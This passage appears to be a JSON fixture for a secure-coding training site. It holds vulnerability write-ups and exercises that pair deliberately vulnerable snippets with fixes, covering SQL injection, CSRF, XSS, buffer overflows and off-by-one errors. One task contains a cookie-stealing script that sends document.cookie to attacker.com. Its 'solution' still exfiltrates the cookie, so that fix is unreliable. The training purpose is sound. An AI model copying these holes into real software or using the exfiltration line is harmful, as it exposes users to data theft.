<li><b>Language Choice:</b> Using languages that enforce memory safety can prevent many vulnerabilities. Languages like Rust, Java, and Python manage memory automatically to avoid common safety pitfalls found in C/C++.</li>\r\n            <li><b>Static Analysis Tools:</b> Tools such as lint, Clang Static Analyzer, and Coverity can analyze source code for common memory safety issues before the code is run.</li>\r\n            <li><b>Dynamic Analysis Tools:</b> Tools like Valgrind, AddressSanitizer, and Purify check for memory corruption issues at runtime, which is useful for detecting use-after-free and buffer overflow vulnerabilities.</li>\r\n            <li><b>Code Reviews and Best Practices:</b> Regular code reviews and adhering to secure coding standards can significantly reduce the likelihood of introducing memory safety issues. Practices such as limiting the use of unsafe functions (e.g., strcpy, sprintf) are beneficial.</li>\r\n            <li><b>Safe Libraries:</b> Using libraries that perform bounds checking or other safety checks can help prevent buffer overflows and similar issues. For example, the C++ Standard Template Library (STL) and other modern C++ features offer safer alternatives to traditional C functions.</li>\r\n        </ol>\r\n        <p>Memory safety vulnerabilities pose significant risks in software development. By understanding these vulnerabilities and implementing robust mitigation strategies, developers can enhance the security and reliability of their software. Embracing modern programming languages and tools that focus on safety can drastically reduce the occurrence of these critical issues.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 7, "fields": {"name": "Authentication", "slug": "authentication", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Authentication vulnerabilities are a significant concern in cybersecurity as they can lead to unauthorized access to systems and data breaches. Below, I'll explain what these vulnerabilities are, how they manifest, and provide examples to help understand and mitigate such risks.</p>\r\n        <p>Authentication vulnerabilities occur when the authentication process of a system, application, or network has flaws that allow an attacker to pose as a legitimate user. These flaws can stem from weak password policies, inadequate security controls, or improper implementation of authentication mechanisms.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/authentication.png\" style=\"width: 700px;\"/>\r\n        </div>\r\n        <h5>Common Types of Authentication Vulnerabilities</h5>\r\n        <ol>\r\n            <li><b>Brute Force Attacks:</b> This involves attempting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords until the correct one is found.</li>\r\n            <li><b>Credential Stuffing:</b> In this scenario, attackers use leaked usernames and passwords from one breach and use them to gain access to accounts on other platforms, exploiting the common practice of reusing the same credentials across multiple services.</li>\r\n            <li><b>Phishing:</b> Attackers use fake login prompts to trick users into entering their credentials. These credentials are then stolen and used by the attacker.</li>\r\n            <li><b>Session Hijacking:</b> The attacker takes over a valid user session. This is typically done by stealing session tokens that can be used to authenticate a session without the need for a username and password.</li>\r\n        </ol>\r\n\r\n        <h5>Examples</h5>\r\n\r\n        <p><b>Brute Force Attack</b></p>\r\n        <p>Imagine a website that does not implement account lockout policies after several failed login attempts. An attacker can use a script to repeatedly try different combinations of usernames and passwords until they gain access. To mitigate this, implement a limit on failed login attempts and use Captcha to detect automated scripts.</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/authentication-ex1.png\" style=\"width: 650px;\"/>\r\n        \r\n        <p><b>Phishing Attack</b></p>\r\n        <p>A phishing attack could involve an email sent to users that appears to be from a trusted source, asking them to log in to their accounts via a link provided in the message. However, this link redirects to a malicious website that mimics the login page of the legitimate site. Always verify the URL before entering login details and educate users about such threats.</p>\r\n        <p><b>Session Hijacking</b></p>\r\n        <p>Consider a user logged into a web application over an unsecured HTTP connection. An attacker could sniff the network traffic, capture the session cookie, and use it to hijack the session. Using HTTPS to secure all connections and implementing secure HTTP headers can help mitigate this risk.</p>\r\n        <img class=\"mx-auto\" src=\"../../static/coding/images/authentication-ex2.png\" style=\"width: 900px;\"/>\r\n        <br>\r\n        <br>\r\n        <p>To protect against authentication vulnerabilities, it is crucial to enforce strong authentication mechanisms like Multi-Factor Authentication (MFA), implement robust security policies, and educate users about security best practices. Regular security audits and updates can also help in identifying and mitigating potential vulnerabilities before they can be exploited by attackers.</p>\r\n    </div>"}}, {"model": "coding.vulnerability", "pk": 8, "fields": {"name": "Business logic vulnerabilities", "slug": "business-logic-vulnerabilities", "description": "<div class=\"mx-auto\" style=\"max-width: 1000px;\">\r\n        <p>Business logic vulnerabilities are a category of security issues where the design or implementation of the application logic can be manipulated or exploited to achieve unintended outcomes. These vulnerabilities are unique to each application and often don't involve typical coding errors that tools like static analysis would detect. Instead, they arise from flaws in the way the application's functionality is designed or from overlooked side effects in the flow of operations.</p>\r\n        <p>Business logic vulnerabilities do not typically result from traditional bugs like buffer overflows or SQL injections. Instead, they stem from the misuse or unintended use of application features. Since they are specific to the applicationТs logic, they can vary widely from one system to another.</p>\r\n        <div style=\"text-align: center;\">\r\n            <img class=\"mx-auto\" src=\"../../static/coding/images/logic.png\" style=\"width: 800px;\"/>\r\n        </div>\r\n\r\n        <h5>Examples</h5>\r\n\r\n        <ol>\r\n            <li><b>E-commerce Price Manipulation</b>\r\n                <ul>\r\n                    <li><b>Scenario:</b> An e-commerce website allows users to add items to their cart. The price displayed on the product page is sent from the client side when the order is made.</li>\r\n                    <li><b>Vulnerability:</b> A user could potentially manipulate the price sent from the client to the server, purchasing items at lower than intended prices.</li>\r\n                    <li><b>Mitigation:</b> Never trust client-side input for critical data. Always verify prices server-side against a reliable source, such as a database.</li>\r\n                </ul>\r\n            </li>\r\n            <li><b>Multi-Stage Process Bypass</b>\r\n                <ul>\r\n                    <li><b>Scenario:</b> A web application requires users to go through multiple steps for important actions, such as setting up a payment method and verifying it.</li>\r\n                    <li><b>Vulnerability:</b> If the server does not enforce the completion of all steps, a user might skip critical security checks.</li>\r\n                    <li><b>Mitigation:</b> Ensure that each step in a process is checked server-side to confirm that previous steps have been completed.</li>\r\n                </ul>\r\n            </li>\r\n            <li><b>Inadequate Access Control in Workflow</b>\r\n                <ul>\r\n                    <li><b>Scenario:</b> An application allows users to submit documents for approval, and only administrators should be able to approve them.</li>\r\n                    <li><b>Vulnerability:</b> If the application does not properly validate the role of the user performing the approval, a regular user might approve their own documents.</li>\r\n                    <li><b>Mitigation:</b> Implement robust role-based access control (RBAC) to ensure that users can only perform actions permitted by their roles.</li>\r\n                </ul>\r\n            </li>\r\n            <li><b>Loyalty Point Exploits</b>\r\n                <ul>\r\n                    <li><b>Scenario:</b> A customer loyalty program grants points for purchases, which can be redeemed for discounts or products.</li>\r\n                    <li><b>Vulnerability:</b> If the system adds points before completing the transaction, a user could repeatedly gain points by starting transactions and not finishing them.</li>\r\n                    <li><b>Mitigation:</b> Award points only after a transaction has been verified and fully completed.</li>\r\n                </ul>\r\n            </li>\r\n        </ol>\r\n\r\n        <h5>Detecting and Preventing Business Logic Vulnerabilities</h5>\r\n        <ul>\r\n            <li><b>Requirements Review:</b> Ensure a deep understanding of the business processes before development begins.</li>\r\n            <li><b>Threat Modeling:</b> Engage in regular threat modeling sessions during the design phase and after major changes.</li>\r\n            <li><b>Code Review and Testing:</b> Conduct rigorous code reviews with a focus on the application logic. Employ manual penetration testing to simulate attacks.</li>\r\n            <li><b>Monitor and Audit:</b> Implement monitoring to detect unusual behaviors indicative of exploitation attempts. Regularly audit logs for signs of abuse.</li>\r\n        </ul>\r\n\r\n        <p>Business logic vulnerabilities represent a significant risk because they exploit the intended functionality of an application. Protecting against them requires careful planning, robust design, and continual vigilance. By understanding and anticipating how users might manipulate the flow of operations, developers and security teams can better safeguard their applications against these insidious threats.</p>\r\n    </div>"}}, {"model": "coding.task", "pk": 17, "fields": {"name": "Add book sqlite", "description": "In this assignment, you will analyze the add_book function, which adds information about books to a database. The function takes two arguments: the title of the book and the author. Your task is to identify vulnerabilities related to the security of SQL query execution.", "slug": "add-book-sqlite", "code_task": "import sqlite3\r\n\r\ndef add_book(title, author):\r\n    conn = sqlite3.connect(\"books.db\")\r\n    c = conn.cursor()\r\n    c.execute(f\"INSERT INTO books (title, author) VALUES ('{title}', '{author}')\")\r\n    conn.commit()\r\n    conn.close()", "solution": "#solution\r\nimport sqlite3\r\n\r\ndef add_book(title, author):\r\n    conn = sqlite3.connect(\"books.db\")\r\n    c = conn.cursor()\r\n    c.execute(\"INSERT INTO books (title, author) VALUES (?, ?)\", (title, author))\r\n    conn.commit()\r\n    conn.close()", "hint": "Pay attention to how the SQL query is formed in the add_book function. Use parameterized queries instead of directly inserting variables into the query string to prevent SQL injection.", "vulnerability": 1, "key_words": "[\"import sqlite3\", \"def add_book(title\", \"author):\", \"INSERT INTO books (title\", \"author) VALUES (?\", \"?)\", \"commit()\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 18, "fields": {"name": "Get product range sqlite", "description": "In this code, there is a potential vulnerability to SQL injection attacks. The SQL query is constructed using string interpolation with user-provided input (min_price and max_price), allowing an attacker to manipulate the query by injecting malicious SQL code. This can lead to unauthorized access or modification of the database.", "slug": "get-product-range-sqlite", "code_task": "import sqlite3\r\n\r\ndef get_products_in_price_range(min_price, max_price):\r\n    connection = sqlite3.connect('products.db')\r\n    cursor = connection.cursor()\r\n\r\n    sql_query = f\"SELECT * FROM products WHERE price >= {min_price} AND price <= {max_price}\"\r\n    cursor.execute(sql_query)\r\n    results = cursor.fetchall()\r\n    connection.close()\r\n\r\n    return results\r\n\r\nmin_price = 10\r\nmax_price = 50\r\nproducts = get_products_in_price_range(min_price, max_price)\r\n\r\nif products:\r\n    for product in products:\r\n        print(f\"Product ID: {product[0]}, Name: {product[1]}, Price: {product[2]}\")\r\nelse:\r\n    print(\"No products found in the specified price range.\")", "solution": "import sqlite3\r\n\r\ndef get_products_in_price_range(min_price, max_price):\r\n    connection = sqlite3.connect('products.db')\r\n    cursor = connection.cursor()\r\n\r\n    sql_query = \"SELECT * FROM products WHERE price >= ? AND price <= ?\"\r\n    cursor.execute(sql_query, (min_price, max_price))\r\n    results = cursor.fetchall()\r\n    connection.close()\r\n\r\n    return results\r\n\r\nmin_price = 10\r\nmax_price = 50\r\nproducts = get_products_in_price_range(min_price, max_price)\r\n\r\nif products:\r\n    for product in products:\r\n        print(f\"Product ID: {product[0]}, Name: {product[1]}, Price: {product[2]}\")\r\nelse:\r\n    print(\"No products found in the specified price range.\")", "hint": "To find the vulnerability, look for where user-provided inputs (min_price and max_price) are directly included in the SQL query string without using parameterized queries.", "vulnerability": 1, "key_words": "[\"import sqlite3\", \"def get_products_in_price_range(min_price\", \"max_price):\", \"connection = sqlite3.connect('products.db')\", \"cursor = connection.cursor()\", \"WHERE price >= ? AND price <= ?\", \"results = cursor.fetchall()\", \"return results\", \"print(f\\\"Product ID: {product[0]}\", \"Name: {product[1]}\", \"Price: {product[2]}\\\")\", \"products = get_products_in_price_range(min_price\", \"max_price)\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 20, "fields": {"name": "Get task postgresql", "description": "Explore the get_task function, which is designed to retrieve a task description by its ID from the database. Evaluate your function implementation for vulnerabilities such as SQL injection, especially considering how the SQL query is constructed. Suggest ways to improve the code to ensure data security.", "slug": "get-task-postgresql", "code_task": "import psycopg2\r\n\r\ndef get_task(task_id):\r\n    connection = psycopg2.connect(\r\n        dbname=\"task_manager\",\r\n        user=\"postgres\",\r\n        password=None,\r\n        host=\"localhost\",\r\n    )\r\n    cursor = connection.cursor()\r\n    query = f\"SELECT description FROM tasks WHERE task_id = {task_id}\"\r\n    cursor.execute(query)\r\n    task = cursor.fetchone()\r\n    cursor.close()\r\n    connection.close()\r\n\r\n    if task is None:\r\n        return \"Task does not exist.\"\r\n    else:\r\n        return task", "solution": "#solution\r\nimport psycopg2\r\n\r\ndef get_task(task_id):\r\n    connection = psycopg2.connect(\r\n        dbname=\"task_manager\",\r\n        user=\"postgres\",\r\n        password=None,\r\n        host=\"localhost\",\r\n    )\r\n    cursor = connection.cursor()\r\n    \r\n    query = \"SELECT description FROM tasks WHERE task_id = %s\"\r\n    cursor.execute(query, (task_id,))\r\n\r\n    task = cursor.fetchone()\r\n    cursor.close()\r\n    connection.close()\r\n\r\n    if task is None:\r\n        return \"Task does not exist.\"\r\n    else:\r\n        return task", "hint": "Explore the use of parameterized queries with placeholders to prevent SQL injections.", "vulnerability": 1, "key_words": "[\"import psycopg2\", \"def get_task(task_id):\", \"dbname=\\\"task_manager\\\"\", \"user=\\\"postgres\\\"\", \"password=None\", \"host=\\\"localhost\\\"\", \"SELECT description FROM tasks WHERE task_id = %s\", \"(task_id\", \")\", \"if task is None:\", \"return \\\"Task does not exist.\\\"\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 21, "fields": {"name": "Count rows postgresql", "description": "Analyze the count_rows function, which counts the number of rows in a specified database table. Evaluate the implementation of the function, especially the way the SQL query is executed, and identify potential vulnerabilities. Suggest improvements to ensure security and correct execution of requests.", "slug": "count-rows-postgresql", "code_task": "import psycopg2\r\n\r\ndef count_rows(table_name):\r\n    connection = psycopg2.connect(\r\n        host=\"localhost\",\r\n        database=\"psycopgtest\",\r\n        user=\"postgres\",\r\n        password=None,\r\n    )\r\n\r\n    with connection.cursor() as cursor:\r\n        cursor.execute(\"SELECT count(*) FROM %(table_name)s \", {\r\n            \"table_name\": table_name,\r\n        })\r\n        result = cursor.fetchone()\r\n\r\n    rowcount, = result\r\n    return rowcount", "solution": "#solution\r\nimport psycopg2\r\nfrom psycopg2 import sql\r\n\r\ndef count_rows(table_name):\r\n    connection = psycopg2.connect(\r\n        host=\"localhost\",\r\n        database=\"psycopgtest\",\r\n        user=\"postgres\",\r\n        password=None, \r\n    )\r\n\r\n    with connection.cursor() as cursor:\r\n        query = sql.SQL(\"SELECT count(*) FROM {table_name}\").format(\r\n            table_name=sql.Identifier(table_name)\r\n        )\r\n        cursor.execute(query)\r\n        result = cursor.fetchone()\r\n\r\n    rowcount, = result\r\n    return rowcount", "hint": "Note the use of a dictionary to pass the table name into the SQL query. Consider how to correctly and safely include a table name in an SQL query to avoid potential vulnerabilities. Use from psycopg2 import sql this module to prevent SQL injection.", "vulnerability": 1, "key_words": "[\"import psycopg2\", \"from psycopg2 import sql\", \"def count_rows(table_name):\", \"host=\\\"localhost\\\"\", \"database=\\\"psycopgtest\\\"\", \"user=\\\"postgres\\\"\", \"password=None\", \"table_name=sql.Identifier(table_name)\", \"sql.SQL(\\\"SELECT count(*) FROM {table_name}\\\").format(\", \"rowcount\", \"= result\", \"return rowcount\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 22, "fields": {"name": "Django templating", "description": "Examine the provided Django form template for potential security vulnerabilities related to data privacy and user input handling. Identify and propose necessary code modifications to mitigate these risks and enhance the form's security.", "slug": "django-templating", "code_task": "<form method=\"post\">\r\n    <form action=\"/your-name/\" method=\"post\">\r\n    <label for=\"your_name\">Your name: </label>\r\n    <input id=\"your_name\" type=\"text\" name=\"your_name\" value=\"{{ current_name }}\">\r\n    <button type=\"submit\">Submit</button>\r\n</form>", "solution": "<form method=\"post\">\r\n\t{% csrf_token %}\r\n\t<form action=\"/your-name/\" method=\"post\">\r\n\t<label for=\"your_name\">Your name: </label>\r\n\t<input id=\"your_name\" type=\"text\" name=\"your_name\" value=\"{{ current_name }}\">\r\n\t<button type=\"submit\">Submit</button>\r\n</form>", "hint": "Use Django's built-in protection system against csrf attacks.", "vulnerability": 3, "key_words": "[\"<form method=\\\"post\\\">\", \"{% csrf_token %}\", \"<form action=\\\"/your-name/\\\" method=\\\"post\\\">\", \"<label for=\\\"your_name\\\">Your name: </label>\", \"<input id=\\\"your_name\\\" type=\\\"text\\\" name=\\\"your_name\\\" value=\\\"{{ current_name }}\\\">\", \"<button type=\\\"submit\\\">Submit</button>\", \"</form>\"]", "lang": "html", "gpt_questions": []}}, {"model": "coding.task", "pk": 23, "fields": {"name": "Flask protection form", "description": "Review the provided Flask-based login form, which collects usernames and passwords. Identify any security vulnerabilities that could expose user data or allow unauthorized access, and suggest the necessary code adjustments to secure the form.", "slug": "flask-protection-form", "code_task": "<form action='/' method='POST' autocomplete=\"off\">\r\n    <input type='text' name='username' id='email' placeholder='username'/>\r\n    <input type='password' name='password' id='password' placeholder='password'/>\r\n    <input type='submit' name='submit' value='login'/>\r\n</form>", "solution": "<form action='/' method='POST' autocomplete=\"off\">\r\n    <input type='text' name='username' id='email' placeholder='username'/>\r\n    <input type='password' name='password' id='password' placeholder='password'/>\r\n    <input type='submit' name='submit' value='login'/>\r\n    <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\">\r\n</form>", "hint": "Use Flask's built-in protection system against csrf attacks.", "vulnerability": 3, "key_words": "[\"<form action='/' method='POST' autocomplete=\\\"off\\\">\", \"<input type='text' name='username' id='email' placeholder='username'/>\", \"<input type='password' name='password' id='password' placeholder='password'/>\", \"<input type='submit' name='submit' value='login'/>\", \"</form>\", \"csrf_token\"]", "lang": "html", "gpt_questions": []}}, {"model": "coding.task", "pk": 24, "fields": {"name": "Flask app protection", "description": "Examine the given Flask application that processes form submissions containing user names and emails. Identify any security flaws, particularly those related to the handling and output of user inputs, and recommend necessary changes to enhance the application's security and data handling practices.", "slug": "flask-app-protection", "code_task": "from flask import Flask, render_template, request\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\r\ndef index():\r\n    if request.method == \"POST\":\r\n        name = request.form[\"name\"]\r\n        email = request.form[\"email\"]\r\n        \r\n        print(f\"Name: {name}, Email: {email}\")\r\n        \r\n        return \"The form has been successfully submitted!\"\r\n\r\n    return render_template(\"index.html\")\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)", "solution": "#solution\r\nfrom flask import Flask, render_template, request\r\nfrom flask_wtf.csrf import CSRFProtect\r\n\r\napp = Flask(__name__)\r\napp.config[\"SECRET_KEY\"] = \"your_secret_key\"\r\ncsrf = CSRFProtect(app)\r\n\r\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\r\ndef index():\r\n    if request.method == \"POST\":\r\n        name = request.form[\"name\"]\r\n        email = request.form[\"email\"]\r\n        \r\n        print(f\"Name: {name}, Email: {email}\")\r\n        \r\n        return \"The form has been successfully submitted!\"\r\n    \r\n    return render_template(\"index.html\")\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)", "hint": "Use the built-in Flask system for generating csrf tokens. from flask_wtf.csrf import CSRFProtect", "vulnerability": 3, "key_words": "[\"from flask import Flask\", \"render_template\", \"request\", \"from flask_wtf.csrf import CSRFProtect\", \"app = Flask(__name__)\", \"app.config[\\\"SECRET_KEY\\\"]\", \"csrf = CSRFProtect(app)\", \"@app.route(\\\"/\\\"\", \"methods=[\\\"GET\\\"\", \"\\\"POST\\\"])\", \"def index():\", \"if request.method == \\\"POST\\\":\", \"name = request.form[\\\"name\\\"]\", \"print(f\\\"Name: {name}\", \"Email: {email}\\\")\", \"return \\\"The form has been successfully submitted!\\\"\", \"email = request.form[\\\"email\\\"]\", \"return render_template(\\\"index.html\\\")\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 26, "fields": {"name": "Java Server Pages", "description": "Analyze the provided search form and associated alert message snippet for potential security risks, particularly focusing on how user inputs are handled and displayed. Identify vulnerabilities such as Cross-Site Scripting (XSS) and suggest code enhancements to prevent exploitation and ensure secure data presentation.", "slug": "java-server-pages", "code_task": "<div class=\"form-group\">\r\n    <label for=\"search\">Search:</label>\r\n    <input type=\"text\" class=\"form-control\" id=\"search\" name=\"search\">\r\n\r\n    <input type=\"submit\" id=\"submit\" class=\"btn\" value=\"Search\">\r\n    <div class=\"alert alert-danger <%=alertVisibility%>\">\r\n        Cannot find <%=request.getParameter(\"search\")%>\r\n    </div>\r\n</div>", "solution": "<div class=\"form-group\">\r\n    <label for=\"search\">Search:</label>\r\n    <input type=\"text\" class=\"form-control\" id=\"search\" name=\"search\">\r\n\r\n    <input type=\"submit\" id=\"submit\" class=\"btn\" value=\"Search\">\r\n    <div class=\"alert alert-danger <%=alertVisibility%>\">\r\n        Cannot find <%=StringEscapeUtils.escapeHtml4(request.getParameter(\"search\"))%>\r\n    </div>\r\n</div>", "hint": "Use Java Server Pages StringEscapeUtils.escapeHtml4 method.", "vulnerability": 2, "key_words": "[\"<div class=\\\"form-group\\\">\", \"<label for=\\\"search\\\">Search:</label>\", \"<input type=\\\"text\\\" class=\\\"form-control\\\" id=\\\"search\\\" name=\\\"search\\\">\", \"<input type=\\\"submit\\\" id=\\\"submit\\\" class=\\\"btn\\\" value=\\\"Search\\\">\", \"<div class=\\\"alert alert-danger <%=alertVisibility%>\\\">\", \"Cannot find <%=StringEscapeUtils.escapeHtml4(request.getParameter(\\\"search\\\"))%>\", \"</div>\"]", "lang": "html", "gpt_questions": []}}, {"model": "coding.task", "pk": 27, "fields": {"name": "Django XSS", "description": "Analyze the provided HTML template with Django templating for security vulnerabilities related to how user-generated content is displayed. Identify and correct potential risks, ensuring that user data is handled securely without compromising the functionality of the web page.", "slug": "django-xss", "code_task": "<!DOCTYPE html>\r\n<html lang=\"ru\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Main page</title>\r\n</head>\r\n<body>\r\n    <h1>Welcome!</h1>\r\n    <p>{{ vulnerabilities_content | safe }}</p>\r\n    {% for vulnerability in vulnerabilities %}\r\n        <p>{{ vulnerability }}</p>\r\n    {% endfor %}\r\n</body>\r\n</html>", "solution": "<!DOCTYPE html>\r\n<html lang=\"ru\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Main page</title>\r\n</head>\r\n<body>\r\n    <h1>Welcome!</h1>\r\n    <p>{{ vulnerabilities_content }}</p>\r\n    {% for vulnerability in vulnerabilities %}\r\n        <p>{{ vulnerability }}</p>\r\n    {% endfor %}\r\n</body>\r\n</html>", "hint": "Check vulnerabilities_content", "vulnerability": 2, "key_words": "[\"<!DOCTYPE html>\", \"<html lang=\\\"ru\\\">\", \"<head>\", \"<meta charset=\\\"UTF-8\\\">\", \"<title>Main page</title>\", \"</head>\", \"<body>\", \"<h1>Welcome!</h1>\", \"<p>{{ vulnerabilities_content }}</p>\", \"{% for vulnerability in vulnerabilities %}\", \"<p>{{ vulnerability }}</p>\", \"{% endfor %}\", \"</body>\", \"</html>\"]", "lang": "html", "gpt_questions": []}}, {"model": "coding.task", "pk": 28, "fields": {"name": "JavaScript parameterized best practice", "description": "Inspect the JavaScript function that retrieves user profile data via AJAX and dynamically executes code based on the received data. Identify security vulnerabilities related to data handling and the use of dynamic execution methods like setTimeout. Propose secure coding practices to prevent issues such as code injection and ensure the integrity of the application.", "slug": "js-best-practice", "code_task": "$get(\"/profile\", function(data, status){\r\n    if(data!=null){\r\n        var dataArgs = data.split(\",\");\r\n        if(dataArgs.length > 1){\r\n            var displayName = dataArgs[0];\r\n            setTimeout(`showProfile('${displayName}')`, 1000);\r\n        }\r\n    }\r\n});", "solution": "$get(\"/profile\", function(data, status){\r\n    if(data!=null){\r\n        var dataArgs = data.split(\",\");\r\n        if(dataArgs.length > 1){\r\n            var displayName = dataArgs[0];\r\n            setTimeout(showProfile, 1000, displayName);\r\n        }\r\n    }\r\n});", "hint": "Write best practice of using setTimeout", "vulnerability": 2, "key_words": "[\"$get(\\\"/profile\\\"\", \"function(data\", \"status){\", \"if(data!=null){\", \"setTimeout(showProfile\", \"1000\", \"displayName);\", \"var dataArgs = data.split(\\\"\", \"\\\");\", \"if(dataArgs.length > 1){\", \"var displayName = dataArgs[0];\"]", "lang": "javascript", "gpt_questions": []}}, {"model": "coding.task", "pk": 29, "fields": {"name": "XSS cookies", "description": "The task at hand involves rectifying a vulnerability present in the provided JavaScript snippet, wherein user cookies are susceptible to exposure to potential attackers. The objective is to amend the code to thwart the execution of malicious JavaScript, thereby diminishing the risk of cookie theft via cross-site scripting (XSS) attacks. This necessitates the implementation of adequate encoding or filtering mechanisms to securely handle user input, in this case, the document's cookie. By addressing this vulnerability, one demonstrates proficiency in web security principles and practices, ensuring the robustness of the code while preserving its intended functionality.", "slug": "xss-cookies", "code_task": "<script>\r\n  var img = new Image();\r\n  img.src = 'http://attacker.com/stealcookie.php?cookie=' + document.cookie;\r\n</script>", "solution": "<script>\r\n    var img = new Image();\r\n    img.src = 'http://attacker.com/stealcookie.php?cookie=' + encodeURIComponent(document.cookie);\r\n</script>", "hint": "Use some method that can encode document.cookie.", "vulnerability": 2, "key_words": "[\"<script>\", \"var img = new Image();\", \"img.src\", \"http://attacker.com/stealcookie.php?cookie=\", \"encodeURIComponent\", \"document.cookie\", \"</script>\"]", "lang": "javascript", "gpt_questions": []}}, {"model": "coding.task", "pk": 30, "fields": {"name": "innerHTML vulnerability", "description": "The task involves addressing a security vulnerability within a code snippet that allows for cross-site scripting (XSS) attacks. The objective is to modify the provided code to prevent malicious script injection, thus ensuring the security and integrity of the web application.", "slug": "innerhtmlL-vulnerability", "code_task": "var div = document.querySelector('#some-div');\r\ndiv.innerHTML = '<script>alert(\"XSS Attack\");</script>';", "solution": "var div = document.querySelector('#some-div');\r\ndiv.textContent = '<script>alert(\"XSS Attack\");</script>';", "hint": "Change innerHTML method to mitigate the XSS vulnerability.", "vulnerability": 2, "key_words": "[\"var div = document.querySelector('#some-div');\", \"textContent\", \"<script>alert(\\\"XSS Attack\\\");</script>\"]", "lang": "javascript", "gpt_questions": []}}, {"model": "coding.task", "pk": 31, "fields": {"name": "Key access", "description": "Examine the provided C code snippet that involves a security vulnerability due to the use of the gets() function, which can lead to buffer overflow attacks. Rewrite the code using a safer alternative to handle user input, ensuring that the input size is limited to prevent overflow. Additionally, ensure the revised code still checks the user's input against a secret key and grants access only if the input matches the secret key. Ensure your solution addresses these issues without introducing new vulnerabilities.", "slug": "key-access", "code_task": "printf(\"Input your key:\\n\");\r\ngets(accessKey);\r\n\r\nif(strncmp(accessKey,SECRET_KEY,9)==0){\r\n    printf(\"ACCESS GRANTED\\n\");\r\n}", "solution": "printf(\"Input your key:\\n\");\r\nfgets(accessKey,9,stdin);\r\n\r\nif(strncmp(accessKey,SECRET_KEY,9)==0){\r\n    printf(\"ACCESS GRANTED\\n\");\r\n}", "hint": "Use fgets function.", "vulnerability": 6, "key_words": "[\"printf(\\\"Input your key:\\\\n\\\");\", \"fgets\", \"accessKey\", \"if(strncmp(accessKey\", \"SECRET_KEY\", \"9)==0){\", \"printf(\\\"ACCESS GRANTED\\\\n\\\");\"]", "lang": "C", "gpt_questions": []}}, {"model": "coding.task", "pk": 32, "fields": {"name": "Secure password validation", "description": "The given code contains a vulnerability in buffer handling due to an inconsistent buffer size. Modify the code to ensure that buffer allocation is consistent with the BUFFER_SIZE constant to prevent potential buffer overflow issues. Additionally, ensure proper input validation and secure password comparison.", "slug": "secure-password-validation", "code_task": "char userPass[5];\r\n\r\nprintf(\"Enter the secret code:\\n\");\r\nfgets(userPass,9,stdin);\r\n\r\nif(strncmp(userPass,PASSWORD,BUFFER_SIZE)==0){\r\n    printf(\"CODE VERIFIED\\n\");\r\n}", "solution": "int BUFFER_SIZE = 9;\r\nchar userPass[BUFFER_SIZE];\r\n\r\nprintf(\"Enter the secret code:\\n\");\r\nfgets(userPass,BUFFER_SIZE,stdin);\r\n\r\nif(strncmp(userPass,PASSWORD,BUFFER_SIZE)==0){\r\n    printf(\"CODE VERIFIED\\n\");\r\n}", "hint": "Use BUFFER_SIZE constant.", "vulnerability": 6, "key_words": "[\"int BUFFER_SIZE\", \"char userPass[BUFFER_SIZE];\", \"printf(\\\"Enter the secret code:\\\\n\\\");\", \"fgets(userPass\", \"BUFFER_SIZE\", \"stdin);\", \"printf(\\\"CODE VERIFIED\\\\n\\\");\"]", "lang": "C", "gpt_questions": []}}, {"model": "coding.task", "pk": 33, "fields": {"name": "Off-by-One vulnerability", "description": "This code snippet continuously reads input from the user and appends it to a buffer buff2 until the total length of appended strings exceeds MAX_SIZE. The off-by-one error occurs due to the comparison operator <= in the condition if(total <= MAX_SIZE). This condition allows total to equal MAX_SIZE, which can lead to a buffer overflow if total exactly matches MAX_SIZE before any additional characters are attempted to be appended. The task involves identifying and correcting this off-by-one error to ensure safe buffer operations and prevent any potential buffer overflow vulnerabilities.", "slug": "off-by-one-vulnerability", "code_task": "int len = 0, total = 0;\r\nwhile(1){\r\n    fgets(buff1, MAX_SIZE, stdin);\r\n    int len =  strnlen(buff1, MAX_SIZE);\r\n    total += len;\r\n    if(total <= MAX_SIZE) strncat(buff2, buff1, len);\r\n    else break;\r\n}", "solution": "int len = 0, total = 0;\r\nwhile(1){\r\n    fgets(buff1, MAX_SIZE, stdin);\r\n    int len =  strnlen(buff1, MAX_SIZE);\r\n    total += len;\r\n    if(total < MAX_SIZE) strncat(buff2, buff1, len);\r\n    else break;\r\n}", "hint": "Consider changing if statement", "vulnerability": 6, "key_words": "[\"int len = 0\", \"total = 0;\", \"while(1){\", \"fgets(buff1\", \"MAX_SIZE\", \"stdin);\", \"int len =  strnlen(buff1\", \"MAX_SIZE);\", \"total += len;\", \"if(total < MAX_SIZE) strncat(buff2\", \"buff1\", \"len);\", \"else break;\"]", "lang": "C", "gpt_questions": []}}, {"model": "coding.task", "pk": 34, "fields": {"name": "C++ array", "description": "This program allows the user to input an index and then outputs the corresponding value of the array arr. However, it lacks validation for the input index, which could lead to accessing memory beyond the bounds of the array. To address this vulnerability, it's crucial to include a check ensuring the input index falls within the valid range of indices. If the index is out of bounds, the program should display an error message instead of attempting to access the array element.", "slug": "c_array", "code_task": "#include <iostream>\r\n\r\nint main() {\r\n    int arr[5] = {1, 2, 3, 4, 5};\r\n    int index;\r\n\r\n    std::cin >> index;\r\n\r\n    std::cout << arr[index] << std::endl;\r\n\r\n    return 0;\r\n}", "solution": "#include <iostream>\r\n\r\nint main() {\r\n    int arr[5] = {1, 2, 3, 4, 5};\r\n    int index;\r\n\r\n    std::cin >> index;\r\n\r\n    if (index >= 0 && index < 5) {\r\n        std::cout << arr[index] << std::endl;\r\n    } else {\r\n        std::cout << \"Error\" << std::endl;\r\n    